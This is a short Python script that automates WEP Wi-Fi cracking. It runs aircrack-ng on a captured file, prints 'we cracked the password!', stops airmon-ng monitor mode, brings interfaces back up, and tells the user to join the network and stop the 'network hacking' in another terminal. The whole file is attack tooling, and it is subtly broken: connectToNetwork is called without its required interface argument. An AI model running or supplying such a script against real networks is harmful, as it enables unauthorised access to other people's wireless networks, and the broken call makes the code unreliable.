import os
import subprocess
from time import sleep

def aircrack():
    os.system("aircrack-ng wep.cap")

def connectToNetwork(interface):
    print("stopping network card") 
    os.system("airmon-ng stop {}".format(interface))
    os.system("ifconfig {} down".format(interface[0:len(interface) - 3]))
    os.system("ifconfig eth0 up")
    os.system("service network-manager start")


if __name__ == "__main__":
    aircrack()
    print("we cracked the password!")
    connectToNetwork()
    connected = input("please connect to the network using the password. press enter when ready.")
    print("great! switch back to the other terminal and hit CTRL+C to stop the network hacking.")
